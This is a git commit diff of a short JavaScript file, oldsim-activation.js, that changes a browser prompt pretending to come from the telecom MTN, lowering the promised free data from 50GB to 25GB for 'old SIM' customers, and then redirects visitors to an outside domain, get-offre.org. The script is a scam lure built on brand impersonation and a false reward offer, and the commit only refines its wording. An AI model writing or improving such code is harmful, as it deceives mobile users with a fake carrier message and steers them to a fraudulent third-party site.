0b1914a99fe2b520e4c272959bc88b067e8da384
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-10-19 14:11:36 -0700

    Update oldsim-activation.js

--- oldsim-activation.js
+++ oldsim-activation.js
@@ -1,6 +1,6 @@
 
-var password = 'Activate 50GB'
-password=prompt('MTN: Dear customer, kindly check if your sim card is qualify to receive from 5GB to Unlimited data, old customers Reward, press OK to Activate now ','Activate 50GB');
-if (password != 'Activate 50GB') {
+var password = 'Activate 25GB'
+password=prompt('MTN: Dear customer, If you still have the old MTN SIM card in your mobile phone, press OK to Activate 25GB NOW ','Activate 25GB');
+if (password != 'Activate 25GB') {
 location.href='https://get-offre.org/data.portal.html';
 }
